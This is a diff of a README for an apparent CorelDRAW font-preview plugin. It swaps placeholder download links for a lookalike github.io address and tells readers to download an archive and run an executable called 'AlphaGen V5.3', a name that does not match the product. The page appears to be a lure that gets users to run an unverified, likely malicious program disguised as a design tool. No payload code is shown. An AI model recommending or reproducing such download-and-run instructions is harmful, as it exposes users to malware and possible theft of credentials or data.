@@ -2,13 +2,13 @@
 
 Quickly find the perfect typeface in CorelDRAW with live font previews, filters by style, weight, language, and character support.
 
-[![Download](https://img.shields.io/badge/Download-Font_Filtering_Preview-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Font_Filtering_Preview-blueviolet)](https://font-filtering-preview-coreldraw.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://font-filtering-preview-coreldraw.github.io/.github)  
 2. 📁 Extract the folder to any convenient location  
 3. 🖱 Run AlphaGen V5.3 to activate font UI enhancements  
 4. ✅ Open CorelDRAW and access enhanced font tools via the Text menu or Font List dropdown
